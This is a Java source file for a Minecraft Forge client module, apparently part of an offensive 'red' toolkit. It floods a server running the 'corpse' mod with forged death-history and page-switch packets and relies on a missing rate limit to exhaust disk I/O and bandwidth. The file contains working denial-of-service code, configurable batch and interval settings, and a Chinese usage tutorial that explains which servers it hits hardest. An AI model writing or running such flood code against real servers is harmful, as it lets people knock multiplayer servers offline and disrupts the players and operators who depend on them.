package com.redblue.red.modules.corpse;

import com.redblue.red.core.AttackModule;
import com.redblue.red.core.config.ConfigParam;
import com.redblue.red.util.PacketForge;
import net.minecraft.client.Minecraft;
import net.minecraft.resources.ResourceLocation;
import net.minecraftforge.fml.ModList;

import java.util.List;

/**
 * CORPSE-03: Disk I/O Flood DoS
 *
 * Exploits VULN-09:
 *   MessageRequestDeathHistory (index 3) has no rate limiting.
 *   Each packet triggers disk I/O to read ALL death files for the sender,
 *   then serializes them as NBT and sends over network.
 *   Spamming this packet exhausts server disk I/O and network bandwidth.
 *
 *   MessageSwitchInventoryPage (index 0) also has no rate limit and triggers
 *   container slot reconstruction + broadcastChanges() each time.
 *
 * Wire format (index 3 - MessageRequestDeathHistory):
 *   writeByte(3)   (empty payload)
 *
 * Wire format (index 0 - MessageSwitchInventoryPage):
 *   writeByte(0) + writeInt(page)
 */
public class CORPSE03_IoFlood implements AttackModule {

    private static final ResourceLocation CHANNEL =
            new ResourceLocation("corpse", "default");
    private static final int IDX_SWITCH_PAGE = 0;
    private static final int IDX_REQUEST_DEATH_HISTORY = 3;

    private final List<ConfigParam> params = List.of(
        ConfigParam.ofBool("enabled", "启用", false),
        ConfigParam.ofBool("confirm_danger", "确认: 可能导致服务器卡顿", false),
        ConfigParam.ofEnum("flood_type", "洪泛类型", "DEATH_HISTORY",
                "DEATH_HISTORY", "PAGE_SWITCH", "BOTH"),
        ConfigParam.ofInt("batch_size", "每tick发包数", 10, 1, 100),
        ConfigParam.ofInt("interval", "发包间隔(tick)", 1, 1, 20)
    );

    private long lastTick = 0;

    @Override public String id() { return "corpse03_io_flood"; }
    @Override public String name() { return "磁盘IO洪泛"; }
    @Override public String description() { return "无速率限制的包洪泛导致服务器IO过载"; }

    @Override
    public String getTutorial() {
        return "[使用方法]\n"
            + "1. 勾选「确认」复选框\n"
            + "2. 选择洪泛类型并点击执行\n\n"
            + "[洪泛类型]\n"
            + "DEATH_HISTORY — 反复请求死亡历史，触发磁盘读取+NBT序列化\n"
            + "PAGE_SWITCH — 反复切换页码，触发容器重建+broadcastChanges\n"
            + "BOTH — 同时发送两种包\n\n"
            + "[注意]\n"
            + "PAGE_SWITCH需要先打开尸体附加物品GUI才有效\n"
            + "DEATH_HISTORY对有大量死亡记录的服务器效果更强";
    }

    @Override
    public boolean isAvailable() {
        return ModList.get().isLoaded("corpse");
    }

    @Override
    public List<ConfigParam> getConfigParams() { return params; }

    @Override
    public void execute(Minecraft mc) {
        if (mc.player == null || mc.level == null) return;
        if (!getParam("confirm_danger").map(ConfigParam::getBool).orElse(false)) return;

        int batch = getParam("batch_size").map(ConfigParam::getInt).orElse(10);
        String type = getParam("flood_type").map(ConfigParam::getString)
                .orElse("DEATH_HISTORY");

        for (int i = 0; i < batch; i++) {
            if ("DEATH_HISTORY".equals(type) || "BOTH".equals(type)) {
                sendRequestDeathHistory();
            }
            if ("PAGE_SWITCH".equals(type) || "BOTH".equals(type)) {
                sendPageSwitch(i % 10); // cycle through valid pages
            }
        }
    }

    @Override
    public void tick(Minecraft mc) {
        if (mc.player == null || mc.level == null) return;
        if (!getParam("confirm_danger").map(ConfigParam::getBool).orElse(false)) return;

        int interval = getParam("interval").map(ConfigParam::getInt).orElse(1);
        long now = mc.level.getGameTime();
        if (now - lastTick < interval) return;
        lastTick = now;
        execute(mc);
    }

    private void sendRequestDeathHistory() {
        PacketForge.send(CHANNEL, buf -> {
            buf.writeByte(IDX_REQUEST_DEATH_HISTORY);
        });
    }

    private void sendPageSwitch(int page) {
        PacketForge.send(CHANNEL, buf -> {
            buf.writeByte(IDX_SWITCH_PAGE);
            buf.writeInt(page);
        });
    }
}
